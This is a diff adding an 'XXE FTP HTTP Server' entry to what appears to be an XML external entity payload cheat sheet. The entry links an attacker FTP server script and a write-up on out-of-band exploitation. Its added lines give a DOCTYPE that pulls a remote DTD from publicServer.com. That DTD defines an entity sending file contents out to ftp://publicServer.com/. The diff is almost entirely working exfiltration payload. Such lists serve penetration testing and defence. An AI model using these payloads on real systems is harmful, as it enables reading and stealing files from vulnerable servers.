@@ -57,3 +57,21 @@
 <!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
 <lolz><lol>3..2..1...&test<lol></lolz>
 ```
+**XXE FTP HTTP Server**
+
+https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
+
+http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
+```
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "http://publicServer.com/parameterEntity_sendftp.dtd">
+%remote;
+%send;
+]>
+<data>4</data>
+
+File stored on http://publicServer.com/parameterEntity_sendftp.dtd
+
+<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
+%param1;
+```
